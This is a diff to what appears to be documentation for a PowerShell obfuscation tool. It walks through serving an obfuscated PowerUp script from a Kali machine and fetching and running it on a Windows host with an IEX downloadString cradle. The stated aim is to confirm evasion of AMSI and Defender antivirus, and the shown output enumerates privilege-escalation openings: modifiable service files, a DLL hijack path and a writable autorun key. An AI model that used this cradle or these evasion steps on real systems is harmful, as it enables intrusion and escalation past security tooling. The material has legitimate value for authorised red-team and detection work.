@@ -61,12 +61,80 @@ ________________________________________________________________________________
 [+] Ended obfuscation at 2022-12-13 00:10:55.818079      
 
 
-Step 2 - Check that the obfuscated 'Invoke-WMIExec.ps1' is working properly without being detected by the AMSI / Defender AV
------------------------------------------------------------------------------------------------------------------------------
-
 jeff@kali:~/Documents/Tools/chameleon-main$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 192.168.1.113 - - [13/Dec/2022 01:11:14] "GET / HTTP/1.1" 200 -
 192.168.1.113 - - [13/Dec/2022 01:11:16] "GET / HTTP/1.1" 200 -
 192.168.1.113 - - [13/Dec/2022 01:11:19] "GET /chameleon-p0w3rup1.ps1 HTTP/1.1" 200 -
 
+
+Step 2 - Check that the obfuscated 'Invoke-WMIExec.ps1' is working properly without being detected by the AMSI / Defender AV
+-----------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Public\Documents> whoami
+laptop1\auditor
+
+PS C:\Users\Public\Documents> net user auditor
+User name                    auditor
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            13/12/2022 01:14:17
+Password expires             11/06/2023 01:14:17
+Password changeable          13/12/2022 01:14:17
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   13/12/2022 01:14:44
+
+Logon hours allowed          All
+
+Local Group Memberships      *Users
+Global Group memberships     *None
+The command completed successfully.
+
+
+PS C:\Users\Public\Documents> IEX(New-Object Net.WebClient).downloadString('http://192.168.1.30:8080/chameleon-p0w3rup1.ps1')
+
+PS C:\Users\Public\Documents> import-module .\chameleon-p0w3rup1.ps1
+
+PS C:\Users\Public\Documents> invoke-allchecks
+
+ServiceName                     : edgeupdate
+Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
+ModifiableFile                  : C:\
+ModifiableFilePermissions       : AppendData/AddSubdirectory
+ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
+StartName                       : LocalSystem
+AbuseFunction                   : bedGMqdrDEwdqmYXMSOKeuFdwrhSoumKQtfqvlIS -Name 'edgeupdate'
+CanRestart                      : False
+Name                            : edgeupdate
+Check                           : Modifiable Service Files
+
+<SNIP>
+
+ModifiablePath    : C:\Python27
+IdentityReference : NT AUTHORITY\Authenticated Users
+Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
+%PATH%            : C:\Python27
+Name              : C:\Python27
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : LSZkZCVxXrdNyziCdjcHsfdRiQujrzGmdsdSOKkde -DllPath 'C:\Python27\wlbsctrl.dll'
+
+<SNIP>
+
+Key            : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\ConnectionCenter
+Path           : "C:\Program Files (x86)\Citrix\ICA Client\concentr.exe" /startup
+ModifiableFile : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=AppendData/AddSubdirectory}
+Name           : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\ConnectionCenter
+Check          : Modifiable Registry Autorun
+
+<SNIP>
